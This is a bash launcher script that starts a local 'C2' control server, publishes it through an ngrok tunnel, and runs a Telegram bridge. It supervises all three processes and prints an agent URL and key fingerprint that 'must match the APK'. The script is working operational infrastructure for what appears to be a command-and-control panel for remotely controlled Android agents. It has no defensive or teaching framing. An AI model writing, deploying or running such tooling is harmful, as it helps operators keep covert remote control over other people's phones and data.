#!/usr/bin/env bash
#
# Start everything, in order, and supervise it.
#
#   ./run.sh              server + tunnel + bridge
#   ./run.sh --no-tunnel  skip ngrok (local only)
#   ./run.sh --no-bridge  server only
#   ./run.sh --check      verify configuration and exit
#
# Configuration comes entirely from .env. Nothing has to be typed at a prompt.
# Ctrl-C stops all three processes.
set -uo pipefail

cd "$(dirname "$0")"
ROOT="$PWD"
mkdir -p logs

# ─── arguments ─────────────────────────────────────────────────────────────
USE_TUNNEL=1
USE_BRIDGE=1
CHECK_ONLY=0
for arg in "$@"; do
  case "$arg" in
    --no-tunnel) USE_TUNNEL=0 ;;
    --no-bridge) USE_BRIDGE=0 ;;
    --check)     CHECK_ONLY=1 ;;
    -h|--help)   sed -n '2,14p' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) echo "unknown option: $arg" >&2; exit 2 ;;
  esac
done

# ─── config ────────────────────────────────────────────────────────────────
if [[ -f .env ]]; then
  set -a; . ./.env; set +a
else
  echo "no .env found — copying .env.example" >&2
  cp .env.example .env
  chmod 600 .env
  echo "edit .env, then run ./run.sh again" >&2
  exit 1
fi

: "${C2_PORT:=5000}"
: "${C2_HOST:=127.0.0.1}"
: "${C2_AUTH:=open}"
: "${C2_BASE:=http://127.0.0.1:${C2_PORT}}"

say()  { printf '\033[36m==>\033[0m %s\n' "$*"; }
ok()   { printf '    \033[32mok\033[0m  %s\n' "$*"; }
warn() { printf '    \033[33m!!\033[0m  %s\n' "$*"; }
bad()  { printf '    \033[31mxx\033[0m  %s\n' "$*"; }

# ─── preflight ─────────────────────────────────────────────────────────────
say "checking configuration"

command -v python3 >/dev/null || { bad "python3 not found"; exit 1; }
ok "python3 $(python3 -V 2>&1 | cut -d' ' -f2)"

if python3 -c "import flask, flask_socketio, httpx" 2>/dev/null; then
  ok "python dependencies present"
else
  bad "missing dependencies — run: pip install -r requirements.txt"
  exit 1
fi

PY=python3
if [[ -x .venv/bin/python ]]; then
  PY=.venv/bin/python
  ok "using .venv"
fi

# Agent key: fall back to the generated secret file so nothing is duplicated.
if [[ -z "${C2_API_KEY:-}" && -f data/c2_api_key.secret ]]; then
  C2_API_KEY="$(tr -d '\n' < data/c2_api_key.secret)"
  export C2_API_KEY
  ok "C2_API_KEY read from data/c2_api_key.secret"
fi

API_KEY_FP="$($PY - <<'EOF' 2>/dev/null || echo "--------"
import hashlib, os
v = os.environ.get("C2_API_KEY", "")
print(hashlib.sha256(v.encode()).hexdigest()[:8] if v else "--------")
EOF
)"
ok "agent key fingerprint ${API_KEY_FP}"

# Telegram credentials
TG_STATE="not configured"
if [[ -n "${TG_BOT_TOKEN:-}" && -n "${TG_CHAT_ID:-}" ]]; then
  if command -v curl >/dev/null; then
    RESP="$(curl -s --max-time 12 \
      "https://api.telegram.org/bot${TG_BOT_TOKEN}/getMe" 2>/dev/null || true)"
    if printf '%s' "$RESP" | grep -q '"ok":true'; then
      NAME="$(printf '%s' "$RESP" | $PY -c \
        'import json,sys; d=json.load(sys.stdin)["result"]; print("@"+d["username"])' \
        2>/dev/null || echo "bot")"
      TG_STATE="valid — ${NAME}, chat ${TG_CHAT_ID}"
    else
      TG_STATE="token rejected by Telegram"
    fi
  else
    TG_STATE="configured (curl unavailable, not verified)"
  fi
fi
if [[ "$TG_STATE" == valid* ]]; then
  ok "telegram ${TG_STATE}"
else
  warn "telegram ${TG_STATE}"
fi

if [[ "$C2_AUTH" == "open" ]]; then
  warn "C2_AUTH=open — fine on localhost, but see run.sh --check notes"
fi
if [[ "$C2_AUTH" == "token" && -z "${C2_ACCESS_TOKEN:-}" ]]; then
  bad "C2_AUTH=token but C2_ACCESS_TOKEN is empty — remote access impossible"
  exit 1
fi

if [[ "$CHECK_ONLY" == "1" ]]; then
  say "check complete"
  exit 0
fi

# ─── already running? ──────────────────────────────────────────────────────
if curl -sf --max-time 2 "${C2_BASE}/api/session" >/dev/null 2>&1; then
  warn "something is already serving ${C2_BASE} — stop it first"
  exit 1
fi

# ─── process control ───────────────────────────────────────────────────────
SERVER_PID=""
TUNNEL_PID=""
BRIDGE_PID=""

cleanup() {
  trap - INT TERM EXIT
  echo
  say "stopping"
  for pid in "$BRIDGE_PID" "$TUNNEL_PID" "$SERVER_PID"; do
    [[ -n "$pid" ]] && kill "$pid" 2>/dev/null || true
  done
  sleep 0.5
  for pid in "$BRIDGE_PID" "$TUNNEL_PID" "$SERVER_PID"; do
    [[ -n "$pid" ]] && kill -9 "$pid" 2>/dev/null || true
  done
  ok "stopped"
}
trap cleanup INT TERM EXIT

wait_for() {   # wait_for <url> <seconds> <label>
  local url="$1" limit="$2" label="$3" waited=0
  while (( waited < limit * 10 )); do
    if curl -sf --max-time 2 "$url" >/dev/null 2>&1; then
      ok "$label ready after ${waited}00ms"
      return 0
    fi
    sleep 0.1
    waited=$((waited + 1))
  done
  bad "$label did not come up within ${limit}s"
  return 1
}

tunnel_url() {
  curl -sf --max-time 3 http://127.0.0.1:4040/api/tunnels 2>/dev/null \
    | $PY -c '
import json, sys
try:
    tunnels = json.load(sys.stdin)["tunnels"]
except Exception:
    sys.exit(1)
for t in tunnels:
    if t.get("proto") == "https":
        print(t["public_url"])
        break
' 2>/dev/null
}

# ─── 1. server ─────────────────────────────────────────────────────────────
say "starting control server on ${C2_HOST}:${C2_PORT}"
# Redirected, not teed: a background process that inherits stdout keeps the
# launching terminal attached, so run.sh would never hand control back.
$PY app.py > logs/server.log 2>&1 &
SERVER_PID=$!

wait_for "http://127.0.0.1:${C2_PORT}/api/session" 20 "server" \
  || { tail -20 logs/server.log; exit 1; }

# ─── 2. tunnel ─────────────────────────────────────────────────────────────
PUBLIC_URL=""
if [[ "$USE_TUNNEL" == "1" && -n "${C2_TUNNEL_DOMAIN:-}" ]]; then
  say "starting tunnel for ${C2_TUNNEL_DOMAIN}"
  if ! command -v ngrok >/dev/null; then
    warn "ngrok not installed — skipping the tunnel"
  elif ! curl -sf --max-time 2 http://127.0.0.1:4040/api/tunnels >/dev/null 2>&1; then
    ngrok http --domain="${C2_TUNNEL_DOMAIN}" "${C2_PORT}" \
      > logs/ngrok.log 2>&1 &
    TUNNEL_PID=$!
    sleep 3
    if kill -0 "$TUNNEL_PID" 2>/dev/null; then
      for _ in $(seq 1 20); do
        PUBLIC_URL="$(tunnel_url)"
        [[ -n "$PUBLIC_URL" ]] && break
        sleep 1
      done
      if [[ -n "$PUBLIC_URL" ]]; then
        ok "tunnel up: ${PUBLIC_URL}"
        printf '%s\n' "$PUBLIC_URL" > data/c2_url.txt
      else
        warn "tunnel did not report a URL — see logs/ngrok.log"
        warn "a reserved free domain needs: ngrok config add-authtoken <token>"
      fi
    else
      warn "ngrok exited — see logs/ngrok.log"
      TUNNEL_PID=""
    fi
  else
    warn "an ngrok agent is already running; reusing it"
    PUBLIC_URL="$(tunnel_url)"
    [[ -n "$PUBLIC_URL" ]] && ok "tunnel: ${PUBLIC_URL}"
  fi
else
  say "tunnel disabled"
fi

# ─── 3. bridge ─────────────────────────────────────────────────────────────
if [[ "$USE_BRIDGE" == "1" ]]; then
  if [[ -z "${TG_BOT_TOKEN:-}" || -z "${TG_CHAT_ID:-}" ]]; then
    warn "TG_BOT_TOKEN / TG_CHAT_ID missing — bridge not started"
  elif [[ "$TG_STATE" != valid* ]]; then
    warn "telegram credentials rejected — bridge not started"
  else
    say "starting telegram bridge"
    # Unbuffered: the bridge reports with bare print(), which sits in a 8 KB
    # buffer when stdout is a file, so logs/bridge.log would stay empty.
    PYTHONUNBUFFERED=1 "$PY" telegram_bridge.py > logs/bridge.log 2>&1 &
    BRIDGE_PID=$!
    sleep 5
    if kill -0 "$BRIDGE_PID" 2>/dev/null; then
      ok "bridge up — $(grep -m1 -oE '\[c2\].*' logs/bridge.log || echo 'starting')"
    else
      bad "bridge exited — see logs/bridge.log"
      BRIDGE_PID=""
    fi
  fi
fi

# ─── summary ───────────────────────────────────────────────────────────────
echo
say "ready"
printf '    panel      %s%s\n' "$C2_BASE" "$([[ -n "$PUBLIC_URL" ]] && printf '  (local)')"
[[ -n "$PUBLIC_URL" ]] && printf '    tunnel     %s\n' "$PUBLIC_URL"
[[ -n "$PUBLIC_URL" ]] && printf '    agent URL  %s\n' "$PUBLIC_URL"
printf '    agent key  %s  (must match the APK)\n' "$API_KEY_FP"
[[ "$USE_BRIDGE" == "1" && -n "$BRIDGE_PID" ]] && \
  printf '    telegram   %s\n' "$([[ "$TG_STATE" == valid* ]] && echo "${TG_STATE#valid — }" || echo "$TG_STATE")"
printf '    logs       logs/server.log  logs/bridge.log  logs/ngrok.log\n'
echo
printf '    build the agent with C2_URL=%s\n' "${PUBLIC_URL:-https://${C2_TUNNEL_DOMAIN:-your-tunnel}}"
echo
say "ctrl-c to stop everything"
echo

# ─── supervise ─────────────────────────────────────────────────────────────
while true; do
  sleep 2
  [[ -n "$SERVER_PID" ]] && ! kill -0 "$SERVER_PID" 2>/dev/null && \
    { echo; bad "server died — see logs/server.log"; exit 1; }
  [[ -n "$BRIDGE_PID" ]] && ! kill -0 "$BRIDGE_PID" 2>/dev/null && \
    { echo; bad "bridge died — see logs/bridge.log"; BRIDGE_PID=""; }
  [[ -n "$TUNNEL_PID" ]] && ! kill -0 "$TUNNEL_PID" 2>/dev/null && \
    { echo; warn "tunnel died — see logs/ngrok.log"; TUNNEL_PID=""; }
done
